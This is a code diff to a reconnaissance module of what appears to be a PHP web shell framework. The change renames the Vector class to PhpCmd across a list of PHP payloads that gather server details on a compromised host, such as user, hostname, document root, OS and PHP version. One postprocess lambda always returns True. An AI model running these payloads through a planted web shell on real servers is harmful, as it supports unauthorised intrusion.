@@ -1,4 +1,4 @@
-from core.vector import Os, Vector
+from core.vector import Os, PhpCmd
 from core.module import Module
 from core import messages
 import random
@@ -35,24 +35,24 @@ class Info(Module):
 
         self._register_vectors(
             [
-            Vector("print(@$_SERVER['DOCUMENT_ROOT']);", 'document_root'),
-            Vector("$u=@posix_getpwuid(@posix_geteuid());if($u){$u=$u['name'];} else{$u=getenv('username');} print($u);", 'whoami'),
-            Vector("print(@gethostname());", 'hostname'),
-            Vector("@print(getcwd());", 'cwd'),
-            Vector("$v=@ini_get('open_basedir'); if($v) print($v);", 'open_basedir'),
-            Vector("(@ini_get('safe_mode') && print(1)) || print(0);", 'safe_mode',
+            PhpCmd("print(@$_SERVER['DOCUMENT_ROOT']);", 'document_root'),
+            PhpCmd("$u=@posix_getpwuid(@posix_geteuid());if($u){$u=$u['name'];} else{$u=getenv('username');} print($u);", 'whoami'),
+            PhpCmd("print(@gethostname());", 'hostname'),
+            PhpCmd("@print(getcwd());", 'cwd'),
+            PhpCmd("$v=@ini_get('open_basedir'); if($v) print($v);", 'open_basedir'),
+            PhpCmd("(@ini_get('safe_mode') && print(1)) || print(0);", 'safe_mode',
              postprocess = lambda x: True if '1' else False
             ),
-            Vector("print(@$_SERVER['SCRIPT_NAME']);", 'script'),
-            Vector("print(@php_uname());", 'uname'),
-            Vector("print(@php_uname('s'));", 'os'),
-            Vector("print(@$_SERVER['REMOTE_ADDR']);", 'client_ip'),
-            Vector('print(@ini_get("max_execution_time"));', 'max_execution_time',
+            PhpCmd("print(@$_SERVER['SCRIPT_NAME']);", 'script'),
+            PhpCmd("print(@php_uname());", 'uname'),
+            PhpCmd("print(@php_uname('s'));", 'os'),
+            PhpCmd("print(@$_SERVER['REMOTE_ADDR']);", 'client_ip'),
+            PhpCmd('print(@ini_get("max_execution_time"));', 'max_execution_time',
              postprocess = lambda x: int(x)
             ),
-            Vector('print(@$_SERVER["PHP_SELF"]);', 'php_self'),
-            Vector('@print(DIRECTORY_SEPARATOR);', 'dir_sep'),
-            Vector("$v=''; if(function_exists( 'phpversion' )) { $v=phpversion(); } elseif(defined('PHP_VERSION')) { $v=PHP_VERSION; } elseif(defined('PHP_VERSION_ID')) { $v=PHP_VERSION_ID; } print($v);", 'php_version')
+            PhpCmd('print(@$_SERVER["PHP_SELF"]);', 'php_self'),
+            PhpCmd('@print(DIRECTORY_SEPARATOR);', 'dir_sep'),
+            PhpCmd("$v=''; if(function_exists( 'phpversion' )) { $v=phpversion(); } elseif(defined('PHP_VERSION')) { $v=PHP_VERSION; } elseif(defined('PHP_VERSION_ID')) { $v=PHP_VERSION_ID; } print($v);", 'php_version')
             ]
         )
 
